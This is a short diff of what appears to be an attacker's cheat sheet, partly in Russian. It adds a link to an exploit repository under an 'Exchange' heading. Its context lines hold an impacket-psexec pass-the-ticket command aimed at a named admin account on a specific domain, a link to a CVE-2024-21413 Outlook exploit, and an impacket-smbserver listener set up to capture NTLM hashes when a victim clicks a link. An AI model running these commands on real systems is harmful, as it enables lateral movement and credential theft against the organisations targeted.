@@ -67,6 +67,8 @@ impacket-psexec -k -no-pass 'edu.stf/s_moses_admin@sdotson.edu.stf'
 
 
 # Exchange 
+https://github.com/hypnguyen1209/CVE-2026-62911   
+
 https://github.com/duy-31/CVE-2024-21413
 ставим слушатель  (сюда приходит хэш после нажатия на ссылку)
 sudo impacket-smbserver -smb2support -ip 0.0.0.0 test /tmp 
